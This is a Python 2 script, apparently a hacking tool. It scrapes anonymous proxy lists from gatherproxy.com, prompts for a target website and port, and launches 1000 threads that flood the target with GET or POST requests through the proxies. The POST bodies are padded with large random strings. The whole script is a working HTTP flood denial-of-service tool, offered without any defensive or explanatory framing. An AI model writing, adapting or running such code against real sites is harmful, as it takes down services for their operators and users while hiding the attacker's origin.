lp=["http://gatherproxy.com/proxylist/anonymity/?t=Anonymous#1","http://gatherproxy.com/proxylist/anonymity/?t=Anonymous#2","http://www.gatherproxy.com/proxylist/anonymity/?t=Anonymous#3","http://www.gatherproxy.com/proxylist/anonymity/?t=Anonymous#4", "http://www.gatherproxy.com/proxylist/anonymity/?t=Anonymous#5", "http://www.gatherproxy.com/proxylist/anonymity/?t=Anonymous#6","http://www.gatherproxy.com/proxylist/anonymity/?t=Anonymous#7","http://www.gatherproxy.com/proxylist/anonymity/?t=Anonymous#8","http://www.gatherproxy.com/proxylist/anonymity/?t=Anonymous#9","http://www.gatherproxy.com/proxylist/anonymity/?t=Anonymous#10","http://www.gatherproxy.com/proxylist/port/8080/?Filter=anonymous&Uptime=0&Port=8080", "http://www.gatherproxy.com/proxylist/anonymity/?t=Elite","http://www.gatherproxy.com/proxylist/anonymity/?t=Anonymous","http://www.gatherproxy.com/"]


import socket, httplib, threading, random, urllib2, urllib
print"""\033[92m

  ################################

                            OOOOOOOOOOOOOOOOOOOO     OOOOOO        OOOOOO     OOOOOOOOOOOOOOOOOOO                          000000000000000000000
                            OOOOOOOOOOOOOOOOOOOO     OOOOOO        OOOOOO     OOOOOOOOOOOOOOOOOOO                           0000000000000000000
                            000000                   000000        000000     000000                                            00000000000000000
                            000000                   000000        000000     000000                                              00000000000000000
                            000000                   000000        000000     000000                                                00000000000000000
                            00000000000000000000     000000        000000     0000000000000000000                                     00000000000000000
                            00000000000000000000     000000        000000     0000000000000000000                 00000000000000000000000000000000000000
                            000000                   000000        000000     000000                              000000000000000000000000000000000000                
                            000000                   000000        000000     000000                               000000000000000000
                            000000                    000000000000000000      000000                                0000000000000000
                            00000000000000000000       0000000000000000       0000000000000000000                    0000000000000
                            00000000000000000000        00000000000000        0000000000000000000                     000000000000
                                                             00000                                                     00000000000
                                                             00000                                                       0000000000
     00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000                          000000000
   000000000000000000000000000000000000000000000000000000000000000000000000                                                  0000000
                                                             00000                                                             000000 
 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000                                     00000
 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000                                           0000
                                                             00000                                                                   000
                                                              000                                                                      00
                                                               0                                                                         0
                                                               0

  
  ################################  """
headers = {"Content-type": "application/x-www-form-urlencoded",
           "Accept": "text/plain"}
def h(s):
    l = ''
    for i in range(0, s):
        a = random.randint(65, 160)
        l += chr(a)
    return(l)

def WriteFile(str):
    with open("proxylist3.txt" ,"a") as f:
        f.write(str+'\n')
        return       
def cr():
 print'\n\n[*] creating random strings...'
 global li 
 li=[]
 for o in range(1000):
  z=h(random.randint(5,10))
  li.append(z)
 return(li)

def en():
 print '\n[*]encoding strings...'
 global lis
 lis=[]
 for v in li:
  q= urllib.urlencode({'search': v*1000})
  lis.append(q)
 return(lis)


def re():
 global pr
 pr=[]
 f=open("proxylist3.txt", "r")
 fl =f.readlines()
 for x in fl:
  pr.append(x)
 return pr

def GetURL(URLString):
 attempts = 0
 while attempts < 300:
  try:
   opener = urllib2.build_opener()
   urllib2.install_opener(opener)
   response = urllib2.urlopen(URLString, timeout = 3)
   content = response.read()
   from bs4 import BeautifulSoup
   soup = BeautifulSoup(content,"html.parser")
   for row in soup.findAll("script"):
    riga= ''.join(map(str, row.contents))
    if 'gp.insertPrx' in riga:
     StrArray = riga.split(":")
     IP = StrArray[3].split(",")[0].replace('\"','')
     port = str(int(StrArray[5].split(",")[0].replace('\"',''), 16))
     WriteFile(IP+","+port)
   break
  except urllib2.URLError as e:
   attempts += 300
   pass
  except socket.error as e:
   pass


with open("proxylist3.txt", "a+") as f:
        f.close()
        
l=0
while l<1:
 re()
 print'\n\n==>proxies:',len(pr)
 w=input('\n\n\n[*]add proxies?\n 1-yes\n 2-no\n>')
 if w==1:
  print '\n[*]scanning for bots please wait:\n'
  for we in lp:
   GetURL(we)
   print '[+]scanned webpages:',lp.index(we)+1
 else: l+=1

i=0
def tx():
 global li
 li=[]
 with open('proxylist3.txt', 'r') as f:
  lines = f.readlines()
  for line in lines:
   li.append(line)
  return(li)
cr()
en()
print'\n[*]done!!!\n\n'
u=raw_input('TARGET:\n(www.example.com)\n>')
p=input('port:\n>')
v=input('options:\n1-GET\n2-POST\n>')
def k():
 global i
 i+=1
 print'\033[92mrequests sent:', i

def so():
 line=random.choice(li)
 ip=line.split(',')[0].split('=')[0]
 p=line.split(',')[1].split('=')[0]
 try:
  conn = httplib.HTTPConnection(ip, int(p))
  if v==1:
   conn.request("GET", 'http://'+u)
   k()
  elif v==2:
   params = random.choice(lis)
   conn.request("POST", 'http://'+u+'/', params, headers)
   k()
 except socket.error as e:
  li.remove(line)

class HTTPThread(threading.Thread):
	def run(self):
		try:
		 while True:
		  so()
		except Exception, ex:
			pass

tx()
for x in range(1000):
  t = HTTPThread()
  t.start()
